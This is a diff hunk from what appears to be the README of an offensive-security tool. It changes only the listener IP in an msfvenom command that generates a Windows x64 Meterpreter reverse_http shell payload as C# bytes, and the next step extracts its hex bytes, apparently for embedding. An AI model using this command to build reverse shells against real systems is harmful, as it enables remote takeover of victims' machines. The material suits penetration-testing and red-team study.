@@ -16,7 +16,7 @@ pip3 install cryptography
 ### Generate payload with msfvenom
 Use `msfvenom` to generate a payload:
 ```shell
-msfvenom --arch x64 --platform windows -p windows/x64/meterpreter/reverse_http LHOST=10.10.16.6 LPORT=9001 -f csharp -o bytesPayload
+msfvenom --arch x64 --platform windows -p windows/x64/meterpreter/reverse_http LHOST=10.10.10.10 LPORT=9001 -f csharp -o bytesPayload
 ```
 
 And extract its hex bytes (comma-separated):
